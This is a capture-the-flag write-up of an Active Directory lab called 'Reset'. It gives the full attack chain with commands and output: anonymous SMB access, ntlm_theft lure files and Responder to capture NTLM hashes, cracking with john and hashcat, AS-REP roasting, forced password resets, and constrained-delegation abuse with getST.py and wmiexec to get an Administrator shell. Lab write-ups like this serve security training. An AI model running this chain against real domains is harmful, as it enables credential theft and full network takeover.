# Reset Writeup

![alt text](/Hard/Reset/Images/image.png)

## Summary:
+ This challenge simulates a cyber-attack scenario where you must exploit an Active Directory environment.
+ Test your penetration skills, bypass security measures, and infiltrate into the system. Will you emerge victorious as you simulate the ultimate organization APT?

## Recon & Enumeration

+ Scan open ports with `Nmap` :
```bash
$ nmap -sS -A -vv -T4 -p- <IP>
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 125 Simple DNS Plus

88/tcp    open  kerberos-sec  syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2025-08-28 18:48:21Z)

135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 125

464/tcp   open  kpasswd5?     syn-ack ttl 125

593/tcp   open  ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0

389/tcp   open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
636/tcp   open  tcpwrapped    syn-ack ttl 125
3268/tcp  open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 125

3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
|_ssl-date: 2025-08-28T18:50:05+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=HayStack.thm.corp
| Issuer: commonName=HayStack.thm.corp
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: HAYSTACK
|   DNS_Domain_Name: thm.corp
|   DNS_Computer_Name: HayStack.thm.corp
|   DNS_Tree_Name: thm.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2025-08-28T18:49:26+00:00

5985/tcp  open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

7680/tcp  open  tcpwrapped    syn-ack ttl 125
9389/tcp  open  mc-nmf        syn-ack ttl 125 .NET Message Framing
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49675/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49684/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49697/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
```


## SMB(139,445):
+ Using `smbclient` list sharenames and domains with no pass with anonymous connection:
```bash
$ smbclient -L HayStack.thm.corp
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
```

--> Potential disk is `Data`.

```bash
$ smbclient //<IP>/Data -N      
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jul 19 15:40:57 2023
  ..                                  D        0  Wed Jul 19 15:40:57 2023
  onboarding                          D        0  Fri Aug 29 02:37:37 2025

                7863807 blocks of size 4096. 3022821 blocks available
smb: \> cd onboarding
smb: \onboarding\> dir
  .                                   D        0  Fri Aug 29 02:38:07 2025
  ..                                  D        0  Fri Aug 29 02:38:07 2025
  5guzb0vd.xt4.pdf                    A  4700896  Mon Jul 17 15:11:53 2023
  d4uhgysa.exn.pdf                    A  3032659  Mon Jul 17 15:12:09 2023
  icjkyyid.dwf.txt                    A      521  Tue Aug 22 01:21:59 2023

                7863807 blocks of size 4096. 3022729 blocks available

```

+  Download all files to local machine. Read file `.txt` , we've compromised the password `<USER>`

```bash
$ cat apkmgwtg.utu.txt 
Subject: Welcome to Reset -�Dear <USER>,Welcome aboard! We are thrilled to have you join our team. As discussed during the hiring process, we are sending you the necessary login information to access your company account. Please keep this information confidential and do not share it with anyone.The initial passowrd is: ResetMe123!We are confident that you will contribute significantly to our continued success. We look forward to working with you and wish you the very best in your new role.Best regards,The Reset Team
```

--> The initial password is: `ResetMe123!`

+ Back to service SMB,  we've found that service would refresh automatically every minutes:

![alt text](/Hard/Reset/Images/Pasted%20image%2020250910175024.png)

--> We could manipulate this to steal hash NTLM through outbound SMB was executed .

## Exploit NTLM relay attack:
+ Using  `ntlm_theft` to create phising files and transfer to SMB service --> Extract NTLM hash.
+ Link script https://github.com/Greenwolf/ntlm_theft
+ Generate fishing email:
```bash
$ python3 ntlm_theft.py -g all -s <IP_Machine> -f test
Created: test/test.scf (BROWSE TO FOLDER)
Created: test/test-(url).url (BROWSE TO FOLDER)
Created: test/test-(icon).url (BROWSE TO FOLDER)
Created: test/test.lnk (BROWSE TO FOLDER)
Created: test/test.rtf (OPEN)
Created: test/test-(stylesheet).xml (OPEN)
Created: test/test-(fulldocx).xml (OPEN)
Created: test/test.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: test/test-(includepicture).docx (OPEN)
Created: test/test-(remotetemplate).docx (OPEN)
Created: test/test-(frameset).docx (OPEN)
Created: test/test-(externalcell).xlsx (OPEN)
Created: test/test.wax (OPEN)
Created: test/test.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: test/test.asx (OPEN)
Created: test/test.jnlp (OPEN)
Created: test/test.application (DOWNLOAD AND OPEN)
Created: test/test.pdf (OPEN AND ALLOW)
Created: test/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: test/Autorun.inf (BROWSE TO FOLDER)
Created: test/desktop.ini (BROWSE TO FOLDER)
Generation Complete.
```

+ We try to `put` each phising files to SMB and use `Responder` to capture SMB NTLM hash:

```bash
$ smbclient //<IP_Target>/Data -N
Try "help" to get a list of possible commands.
smb: \> cd onboarding
smb: \onboarding\> dir
  .                                   D        0  Wed Sep 10 18:39:46 2025
  ..                                  D        0  Wed Sep 10 18:39:46 2025
  k151spcj.dwz.txt                    A      521  Tue Aug 22 01:21:59 2023
  m2tdtinl.jgc.pdf                    A  3032659  Mon Jul 17 15:12:09 2023
  xgpziq5r.jdb.pdf                    A  4700896  Mon Jul 17 15:11:53 2023

                7863807 blocks of size 4096. 3025895 blocks available
smb: \onboarding\> put test.asx
putting file test.asx as \onboarding\test.asx (0.2 kb/s) (average 0.2 kb/s)
smb: \onboarding\> dir
  .                                   D        0  Wed Sep 10 18:40:06 2025
  ..                                  D        0  Wed Sep 10 18:40:06 2025
  k151spcj.dwz.txt                    A      521  Tue Aug 22 01:21:59 2023
  m2tdtinl.jgc.pdf                    A  3032659  Mon Jul 17 15:12:09 2023
  test.asx                            A      149  Wed Sep 10 18:40:06 2025
  xgpziq5r.jdb.pdf                    A  4700896  Mon Jul 17 15:11:53 2023

                7863807 blocks of size 4096. 3025885 blocks available
smb: \onboarding\> put test.jnlp
putting file test.jnlp as \onboarding\test.jnlp (0.2 kb/s) (average 0.2 kb/s)
smb: \onboarding\> put test.lnk
putting file test.lnk as \onboarding\test.lnk (2.6 kb/s) (average 0.9 kb/s)
...
```


+ Using `Responder` to capture SMB hash:
```bash
$ sudo responder -I tun0
[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.14.101.136]
    Responder IPv6             [fe80::5c4b:244a:2bd2:125d]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]
    
[+] Listening for events...                                                                                                         
[SMB] NTLMv2-SSP Client   : 10.201.24.64
[SMB] NTLMv2-SSP Username : THM\AUTOMATE
[SMB] NTLMv2-SSP Hash     : AUTOMATE::THM:e9cff49797add952:0E06F864AD93BAAA9BA762E440DAC7FA:0101000000000000008B633A8122DC01F1280F75879F719500000000020008004A0057005A00420001001E00570049004E002D004B0034003700480039004F003000300049004600550004003400570049004E002D004B0034003700480039004F00300030004900460055002E004A0057005A0042002E004C004F00430041004C00030014004A0057005A0042002E004C004F00430041004C00050014004A0057005A0042002E004C004F00430041004C0007000800008B633A8122DC01060004000200000008003000300000000000000001000000002000000669BAF7784B158C72FF601540273FCC9B767E1B3911B02440E50D3C75520CEC0A001000000000000000000000000000000000000900240063006900660073002F00310030002E00310034002E003100300031002E003100330036000000000000000000                                                                                                        
[*] Skipping previously captured hash for THM\AUTOMATE
```

+ Crack NTLM hash with `JohnTheRipper` and get the password:
```bash
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Passw0rd1        (AUTOMATE)     
1g 0:00:00:00 DONE (2025-09-11 17:23) 12.50g/s 2841Kp/s 2841Kc/s 2841KC/s astigg..920227
Session completed.
```

+ Login credential `AUTOMATE:Passw0rd1` :
```bash
$ evil-winrm -i 10.201.100.249 -u AUTOMATE -p Passw0rd1
*Evil-WinRM* PS C:\Users\automate\Desktop> dir

    Directory: C:\Users\automate\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/21/2016   3:36 PM            527 EC2 Feedback.website
-a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website
-a----        6/16/2023   4:35 PM             31 user.txt
```


## Lateral Movement:
+ Using `Bloodhound-Python` to collect Active Directory:
```bash
$ bloodhound-python -u AUTOMATE -p Passw0rd1 -d thm.corp -ns <IP> -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: thm.corp
INFO: Getting TGT for user
INFO: Connecting to LDAP server: haystack.thm.corp
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to GC LDAP server: haystack.thm.corp
INFO: Connecting to LDAP server: haystack.thm.corp
INFO: Found 42 users
INFO: Found 55 groups
INFO: Found 3 gpos
INFO: Found 222 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: HayStack.thm.corp
INFO: Done in 02M 25S
INFO: Compressing output into 20250911175146_bloodhound.zip
```

+ Using `BloodHound` to load file .zip and check the relationship between ADs
+ Check the feature `Cypher`:   `AS-REP Roastable users (DontReqPreAuth)`, we had the list available domain:
```
TABATHA_BRITT@THM.CORP
LEANN_LONG@THM.CORP
ERNESTO_SILVA@THM.CORP
```

+ Using script `GetNPUsers.py` to capture the retrieved AS-REP hashes:
```bash
$ python3 GetNPUsers.py thm.corp/ -dc-ip <IP_Target> -usersfile ~/list.txt -format hashcat -outputfile ~/hashes.txt -no-pass 
Impacket v0.13.0.dev0+20250820.203717.835623ae - Copyright Fortra, LLC and its affiliated companies 

$krb5asrep$23$TABATHA_BRITT@THM.CORP:328bd7549921f3569a991d0390154802$66219ff8c99378c6b6aeaef060bd3a0f9c17e84901fc3db045bd2bcb1478b04216c5860e2f25d36e68bc02e02fa04df3e2afda5643e34189c270d79f50b16e5ab72cee0dffa86b90a27681a9623102449eb65c9e5200601ec1c453fb650cf594cfb13b4799ae7fb5a6c902c3fcf6d558aee92be062d39686b6c81e8de1c04672f086caed8eae3efc2188321a710ed376a4312f9a92689debf8b47addf73c61bcbe7ec2a1cfa71862a58fc003c71ee63dbb402a3035189e939013b60e37a7926b7d650b221553e96a1066e5bf1fffd3382ace14e240e042808b6d0fedab3038c103ae7789
$krb5asrep$23$LEANN_LONG@THM.CORP:61ab84a083d3e4fc6816251c363f6b2a$9092b73ba1726a6d23dabec0a5d736736aac9fa22834348b30f2c570e8a5a29c25b676228936e287ed5a01395b1ddc2d11e0f7a2f3210d9ea3916f4b8116b91ce3cc7db6a6191aa9e9aba6ec2ac5bd6012c8203e0106f160168dc409d78101d6e7fad2a6ce648868b7a30c55b5feea8d14d69e4a175a5837e3a2c10bdc8a1160b34e4df414bc316ee40204134b8211bcf58075da6c8aed6967d7f8a7f8a607727684b7940922cba33abb46735cf8e2d4c40eefdf60c6adcbab1ff1e062767f8a883fb3c1467df273c3b70e8449c86159278def1aa751b7d3586c3b5a47eb1c5eee9da85e
$krb5asrep$23$ERNESTO_SILVA@THM.CORP:f2e06f07cf3563492bca700fd95492b5$7a771822862d5dde808df87e22e2293112072388aa669395645513772ee5defa42b0bb4f59d04ce1d57ff9cc08417c4dab6477693d1a870c1a96b0aac4e3ef641b9b2b96cfee7de5b6fd10d41be71972690536f90e301ec1c07500f3f36100f842d47b49321d84e1cdd4e939ebfe4a2deafeec962b7a92d7a62ffb7ffcb3cafcf5f0e452c89df5374562d817c5610a8d6fc70a59a045cbba24dd3255cabc4d7713157669c11d9a3872cc5b8974f8fb3d5e9c755bb58131769e819d3957b909bd673cebb8f8e0f77e5b56c7f8b16d27eae629250847fe2624e708e076e544764c8dec7f44
```

+ Using `Hashcat` to crack AS-REP hashes:
```bash
$ hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt

$krb5asrep$23$TABATHA_BRITT@THM.CORP:328bd7549921f3569a991d0390154802$66219ff8c99378c6b6aeaef060bd3a0f9c17e84901fc3db045bd2bcb1478b04216c5860e2f25d36e68bc02e02fa04df3e2afda5643e34189c270d79f50b16e5ab72cee0dffa86b90a27681a9623102449eb65c9e5200601ec1c453fb650cf594cfb13b4799ae7fb5a6c902c3fcf6d558aee92be062d39686b6c81e8de1c04672f086caed8eae3efc2188321a710ed376a4312f9a92689debf8b47addf73c61bcbe7ec2a1cfa71862a58fc003c71ee63dbb402a3035189e939013b60e37a7926b7d650b221553e96a1066e5bf1fffd3382ace14e240e042808b6d0fedab3038c1
03ae7789:marlboro(1985)

Approaching final keyspace - workload adjusted.
```

--> We had the credential `TABATHA_BRITT:marlboro(1985)`

+ We used the feature `PATHFINDING` to check the relationship between `TABATHA_BRITT` and `ADMINISTRATOR`:

![alt text](/Hard/Reset/Images/Pasted%20image%2020250911185743.png)

--> We had the concept path to privilege to Administrator

## Lateral Movement to each Users:

+ With `PATHFINDING` in BloodHound, user `TABATHA_BRITT` have the permission `GenericAll` with user `SHAWNA_BRAY` --> This means we can change password user `SHAWNA_BRAY` from user `TABATHA_BRITT` without current password.
+ Firstly, we login user `TABATHA_BRITT` with RDP and change password user `SHAWNA_BRAY` :

```bash
xfreerdp3 /v:<IP_TARGET> /u:TABATHA_BRITT /p:'marlboro(1985)' /d:THM.CORP
```

![alt text](/Hard/Reset/Images/Pasted%20image%2020250915174309.png)
--> Change successfully and we will access to user `SHAWNA_BRAY`.

+ User `SHAWNA_BRAY` have permission `ForceChangePassword` --> This means The user `SHAWNA_BRAY` has the capability to change the user `CRUZ_HALL's password` without knowing that user's current password.
+ Access user `SHAWNA_BRAY` with password changed
![alt text](/Hard/Reset/Images/Pasted%20image%2020250915174957.png)
--> We could run command `net user` to change password so we need to research to find way.
+ After researching, we found the native powershell to reset password user (If we have AD module):
```bash
Set-ADAccountPassword -Identity CRUZ_HALL -NewPassword (ConvertTo-SecureString 'Admin123' -AsPlainText -Force) -Reset
```

![alt text](/Hard/Reset/Images/Pasted%20image%2020250915175712.png)
--> We've reset password successfully !

+ User `CRUZ_HALL` also had the permission `ForceChangePassowrd` with user `DARLA_WINTERS` so we could run powershell to reset password.
![alt text](/Hard/Reset/Images/Pasted%20image%2020250915180157.png)

+ Now we're able to access to user `DARLA_WINTERS` and this user also had the permission `AllowedToDelegate` to domain computer `HAYSTACK.THM.CORP` .
+ Read the General of permission and we could manipulate this permission to privilege to Administrator.
+ Base `Linux Abuse` we could use script `getST.py` to requests a TGT for the *victim* user and executes the `S4U2self/S4U2proxy` process to impersonate the "admin" user
![alt text](/Hard/Reset/Images/Pasted%20image%2020250915182438.png)

+ Run script `getST.py`:
```bash
$ sudo python3 getST.py THM.CORP/DARLA_WINTERS:'Admin123' -spn cifs/HAYSTACK.THM.CORP -impersonate Administrator -dc-ip <IP_Target>
Impacket v0.13.0.dev0+20250820.203717.835623ae - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_HAYSTACK.THM.CORP@THM.CORP.ccache
```

+ We used `WMIExec.py` to access (Because PSExec didn't work):
```bash
$ sudo wmiexec.py THM.CORP/Administrator@HAYSTACK.THM.CORP -k -no-pass  
/usr/local/bin/wmiexec.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20250820.203717.835623ae', 'wmiexec.py')
Impacket v0.13.0.dev0+20250820.203717.835623ae - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
thm\administrator
```

***Note: Before using WMIExec.py we need to set up the Kerberos ticket with command `export KRB5CCNAME=Administrator@cifs_HAYSTACK.THM.CORP@THM.CORP.ccache` ***

![alt text](/Hard/Reset/Images/Pasted%20image%2020250915185020-1.png)
----